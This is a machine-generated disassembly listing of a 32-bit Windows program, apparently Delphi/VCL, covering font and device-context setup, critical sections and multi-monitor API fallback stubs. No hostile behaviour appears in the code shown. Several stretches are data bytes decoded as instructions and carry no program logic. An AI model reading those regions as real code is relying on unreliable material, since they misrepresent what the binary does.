mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41be78
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_41c0a4
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41c0a4
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_429dd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_42414c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429dab
mov eax [ ebp - 0x4 ]
call sub_40324c
call sub_403a00
call sub_403a54
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429dd0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_429e10
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4276e4
mov eax [ ebx + 0x28 ]
call sub_4276e8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_429e90
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_429c64
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_41c0dc
pop esi
pop ebx
retn
sub_429ee0
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_4247a0
mov [ rw-data ] eax
pop ebx
retn
sub_429f18
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_429f5c
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_429f18
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_42a028
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_42a060
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax esi
call sub_42a258
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_42a0a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42a08c
xor eax eax
push ebp
push sub_42a145
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a14c
mov eax [ ebp - 0x4 ]
call sub_42a098
retn
mov eax 0x10
call sub_4027b4
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42a158
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_42a158
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42818c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42a237
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_428754
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_42383c
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_423720
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_418e04
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_423ac4
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_423e20
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_428410
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a258
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42a08c
xor eax eax
push ebp
push sub_42a2a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a2aa
mov eax [ ebp - 0x4 ]
call sub_42a098
retn
mov esp ebp
pop ebp
retn
sub_42a2aa
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4027d4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_40324c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42a08c
xor eax eax
push ebp
push sub_42a2a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a2aa
mov eax [ ebp - 0x4 ]
call sub_42a098
retn
mov esp ebp
pop ebp
retn
sub_42a2d0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_422a94
push eax
mov eax ebx
call sub_422a94
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_42a0a4
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_42a306
mov eax eax
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a3d1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a3d8
retn
mov eax [ rw-data ]
call sub_40324c
mov eax [ rw-data ]
call sub_40324c
mov eax [ rw-data ]
call sub_40324c
call sub_4273c8
mov eax [ rw-data ]
call sub_40324c
mov eax [ rw-data ]
call sub_40324c
mov eax [ rw-data ]
call sub_40324c
mov eax [ rw-data ]
call sub_40324c
mov eax [ rw-data ]
call sub_40324c
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404a50
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404a50
sub_42a3dc
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_429ee0
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_429f5c
mov cx 0x2c
mov dl 0x1
mov eax [ sub_4221d8 ]
call sub_42224c
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_4221d8 ]
call sub_42224c
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_4221d8 ]
call sub_42224c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a028
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a44c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a44c
mov [ rw-data ] eax
mov ecx sub_422aa4
mov edx sub_422ab4
mov eax [ r-xdata ]
call sub_419c00
mov ecx r-xdata
mov edx sub_422cbc
mov eax [ r-xdata ]
call sub_419c00
sub_42a524
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
nop
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a50d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a514
inc edx
add [ eax + eax ] dl
add [ eax ] al
sar [ esi + 0x41 ] 0x1
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
mov esp 0x600041a0
mov [ 0xffffffffa6a80041 ] al
inc edx
add [ eax ] dl
mov eax [ 0xffffffffa18c0041 ]
inc ecx
add [ ebx ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
cmpsb [ esi ] [ edi ]
aam 0xa5
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
movsd [ edi ] [ esi ]
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax ] dh
adc [ eax ] eax
xchg esp eax
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax ] dh
cmpsd [ esi ] [ edi ]
inc edx
add [ edx + ebp + 0x40 ] al
add [ edi + 0x42 ] dh
add [ eax - 0x59 ] ah
inc edx
add [ esp + edx * 2 ] cl
dec edi
jb r-xdata
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
push esp
push ebx
je r-xdata
jb r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_41a448
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax - 0x6bffbd5b ] cl
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax ] dh
cmpsd [ esi ] [ edi ]
inc edx
add [ edi - 0x588bffbe ] dl
inc edx
add [ eax - 0x59 ] ah
inc edx
add [ esi ] al
dec esp
imul esi [ ebx + 0x74 ] 0x3c00408d
cmpsb [ esi ] [ edi ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5a ] cl
mov eax edi
call sub_40324c
sub_42a650
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40321c
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_42a6a8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_41a448
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_40324c
sub_42a6ec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40321c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_42a730
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_40324c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40323c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_42a774
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_41a128
mov eax esi
pop esi
pop ebx
retn
sub_42a7a0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a7c5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a7cc
retn
sub_42a892
mov eax eax
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a8b9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a8c0
retn
sub_42a8cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40444c
xor eax eax
push ebp
push sub_42a98b
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a992
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40445c
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42a8cc
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f9c
sub_42a9b4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_42a8cc
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_42aa3c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_42a8cc
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_42aacc
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_42a8cc
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_42aa3c
sub_42ab62
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_42a8cc
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_42abe3
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42a8cc
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42acd0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_42a8cc
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42ada4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_42a8cc
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42ae78
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_42a8cc
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_42b013
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42b039
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b040
retn
sub_42b054
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b079
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b080
retn
sub_42b0f8
cld
mov al 0x42
adc eax 0x65705349
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
je r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
insd
dec eax
insb
jo r-xdata
jo r-xdata
mov al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 4 ] dh
inc edx
outsb
je r-xdata
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x11a47265
inc eax
add [ ecx ] al
xchg ebx eax
cld
lodsd [ esi ]
add [ ecx ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
imul esp [ ebp + 0x77 ] 0xb0f87265
inc edx
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x42b2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0xc0042b2 ] ch
add [ eax ] al
add [ eax ] dh
adc [ eax ] eax
xchg esp eax
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ esi ] cl
